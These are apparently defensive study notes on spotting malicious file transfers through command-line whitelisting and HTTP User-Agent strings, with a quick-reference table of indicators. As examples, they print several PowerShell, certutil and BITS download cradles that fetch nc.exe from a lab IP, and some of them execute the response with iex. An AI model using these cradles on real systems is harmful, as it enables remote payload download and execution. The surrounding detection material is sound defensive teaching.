# 🛡️ Detection — File Transfers & Command Lines

> [!info]+ 🎯 Core Idea  
> Malicious file transfers can be detected by looking at **how commands are executed** and **how network clients identify themselves**.
> 
> ```text
> 🖥️ Command Execution
>        │
>        ├── 🔎 Command-line detection
>        │
>        ▼
> 🛡️ Security Controls
> 
> 🌐 HTTP File Transfer
>        │
>        ├── 🔎 User-Agent
>        │
>        ▼
> 🛡️ SIEM / Threat Hunting
> ```

---

# 1️⃣ Command-Line Detection

There are two common approaches:

### 🚫 Blacklisting

A blacklist contains commands or patterns known to be suspicious.

```text
🚨 Known Bad Command
        │
        ▼
    ❌ Block / Alert
```

> [!warning]+ ⚠️ Weakness of Blacklisting  
> Blacklist-based command-line detection can be relatively easy to bypass.
> 
> Even simple **case obfuscation** may be enough to evade a basic blacklist.
> 
> ```text
> ❌ Blacklist
>      │
>      ├── Detect exact pattern
>      │
>      └── 🔄 Change case / representation
>                    │
>                    ▼
>                 Potential
>                 Evasion
> ```

---

# 2️⃣ Whitelisting

A **whitelist** defines commands or command lines considered legitimate for a particular environment.

Although creating the whitelist can initially be time-consuming, the material describes it as **very robust**.

```text
🏢 Environment
      │
      ▼
📋 Known Legitimate Commands
      │
      ▼
✅ Whitelist
      │
      ▼
🔎 Compare Activity
      │
      ├── ✅ Expected → Allow
      │
      └── 🚨 Unusual → Alert
```

> [!important]+ 🧠 Key Difference  
> **Blacklist:** "Do I recognize this as bad?"
> 
> **Whitelist:** "Do I recognize this as legitimate?"
> 
> A whitelist can therefore make unusual command lines stand out quickly.

---

# 🌐 3️⃣ HTTP User-Agent Detection

When an HTTP client connects to a web server, it commonly sends a **User-Agent** string.

The User-Agent identifies the HTTP client.

For example:

```text
🌐 Browser
   │
   ▼
HTTP Request
   │
   ▼
User-Agent: Firefox / Chrome
```

But browsers aren't the only HTTP clients that have User-Agent strings.

Other examples include:

- 🐚 `cURL`
    
- 🐍 Python scripts
    
- 🔎 `sqlmap`
    
- 🗺️ `Nmap`
    
- 🪟 PowerShell
    
- 🧰 Other HTTP-enabled tools
    

---

# 4️⃣ Why User-Agent Strings Matter

> [!tip]+ 🔎 Detection Opportunity  
> Organizations can build a list of **known legitimate User-Agent strings**, including:
> 
> - 🌐 Normal browsers
>     
> - 🪟 Default operating-system processes
>     
> - 🔄 Windows Update
>     
> - 🛡️ Antivirus update services
>     
> - 🧰 Other known legitimate software
>     
> 
> These can then be used within a **SIEM** to filter expected traffic and focus on anomalies.

```text
                 🌐 HTTP Traffic
                       │
                       ▼
                 🏷️ User-Agent
                       │
                       ▼
                 🖥️ SIEM
                       │
             ┌─────────┴─────────┐
             ▼                   ▼
       ✅ Known / Legit       🚨 Anomalous
             │                   │
             ▼                   ▼
          Filter             Investigate
```

> [!note]+ 🧠 Important  
> A suspicious User-Agent **doesn't automatically mean malicious activity**.
> 
> It should be investigated to determine what the client was actually doing.

---

# 🪟 5️⃣ PowerShell — Invoke-WebRequest

The material shows `Invoke-WebRequest` and `Invoke-RestMethod` being used to download a file.

### Client

```powershell
Invoke-WebRequest http://10.10.10.32/nc.exe `
-OutFile "C:\Users\Public\nc.exe"

Invoke-RestMethod http://10.10.10.32/nc.exe `
-OutFile "C:\Users\Public\nc.exe"
```

### Server Observes

```http
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
```

### 🔎 Detection Point

```text
🪟 PowerShell
      │
      ▼
🌐 HTTP GET
      │
      ▼
🏷️ User-Agent
      │
      ▼
WindowsPowerShell/5.1...
```

The User-Agent contains an indicator that the request originated from **Windows PowerShell**.

---

# 🪟 6️⃣ WinHttpRequest

PowerShell can also use the COM object:

```text
WinHttp.WinHttpRequest.5.1
```

### Client

```powershell
$h = new-object -com WinHttp.WinHttpRequest.5.1
$h.open('GET','http://10.10.10.32/nc.exe',$false)
$h.send()
iex $h.ResponseText
```

### Server

```http
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```

### 🔎 Detection Signature

```text
User-Agent:
Mozilla/4.0
WinHttp.WinHttpRequest.5
```

---

# 🪟 7️⃣ Msxml2.XMLHTTP

Another HTTP client available through PowerShell is:

```text
Msxml2.XMLHTTP
```

### Client

```powershell
$h = New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET','http://10.10.10.32/nc.exe',$false)
$h.send()
iex $h.responseText
```

### Server

```http
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```

### 🧠 Detection

The HTTP request exposes a distinctive User-Agent and several headers that can help identify the client.

---

# 🪟 8️⃣ Certutil

The material shows two Certutil download methods:

```cmd
certutil -urlcache -split -f http://10.10.10.32/nc.exe

certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```

### Server Sees

```http
GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0
```

### 🔎 Detection Signature

```text
🏷️ User-Agent:
Microsoft-CryptoAPI/10.0
```

This gives defenders a network-level indicator associated with the Certutil transfer.

---

# 🪟 9️⃣ BITS

The material also demonstrates file transfer using **BITS**.

### Client

```powershell
Import-Module bitstransfer

Start-BitsTransfer `
'http://10.10.10.32/nc.exe' `
$env:temp\t

$r = gc $env:temp\t
rm $env:temp\t
iex $r
```

### Server Sees

```http
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
```

### 🔎 Detection Signature

```text
🏷️ User-Agent:
Microsoft BITS/7.8
```

---

# 📊 🔟 User-Agent Quick Reference

|🧰 Transfer Method|🌐 User-Agent / Indicator|
|---|---|
|PowerShell `Invoke-WebRequest`|`WindowsPowerShell/5.1.14393.0`|
|`WinHttpRequest`|`WinHttp.WinHttpRequest.5`|
|`Msxml2.XMLHTTP`|`MSIE 7.0 ... Trident/7.0 ...`|
|`Certutil`|`Microsoft-CryptoAPI/10.0`|
|BITS|`Microsoft BITS/7.8`|

> [!important]+ 🎯 Memorize These
> 
> ```text
> PowerShell ──→ WindowsPowerShell/...
> WinHTTP ─────→ WinHttp.WinHttpRequest.5
> Certutil ────→ Microsoft-CryptoAPI/10.0
> BITS ────────→ Microsoft BITS/7.8
> ```

---

# 🧠 1️⃣1️⃣ Detection Strategy

A useful defensive approach is to combine **command-line analysis** with **network-level analysis**.

```text
                 🛡️ DETECTION
                      │
          ┌───────────┴───────────┐
          ▼                       ▼
   💻 Command Line             🌐 Network
          │                       │
          ▼                       ▼
   📋 Whitelist              🏷️ User-Agent
          │                       │
          └───────────┬───────────┘
                      ▼
                  🖥️ SIEM
                      │
                      ▼
               🔎 Threat Hunting
                      │
                      ▼
                🚨 Anomaly
                      │
                      ▼
                 Investigation
```

---

# ⚡ 1️⃣2️⃣ Final Takeaways

> [!success]+ 🎯 What You Should Remember
> 
> **1. Blacklists** 🚫  
> Easy to bypass when detection relies on simple patterns.
> 
> **2. Whitelists** 📋  
> More time-consuming to build, but can provide robust detection of unusual command lines.
> 
> **3. User-Agent strings** 🏷️  
> HTTP clients identify themselves through User-Agent strings, making them useful detection signals.
> 
> **4. SIEM** 🖥️  
> Known legitimate User-Agents can be filtered so analysts can focus on anomalies.
> 
> **5. Built-in tools can still be detected** 🛡️  
> Using a legitimate Windows utility doesn't make the network activity invisible.
> 
> ```text
> 🧰 Built-in Tool
>       │
>       ▼
> 🌐 HTTP Request
>       │
>       ▼
> 🏷️ User-Agent
>       │
>       ▼
> 🖥️ SIEM
>       │
>       ▼
> 🔎 Anomaly Detection
>       │
>       ▼
> 🚨 Investigation
> ```
> 
> **💡 Big Picture:** Detection isn't only about _what binary was executed_. Defenders can also examine **command lines, HTTP behavior, headers, and User-Agent strings** to identify suspicious file-transfer activity.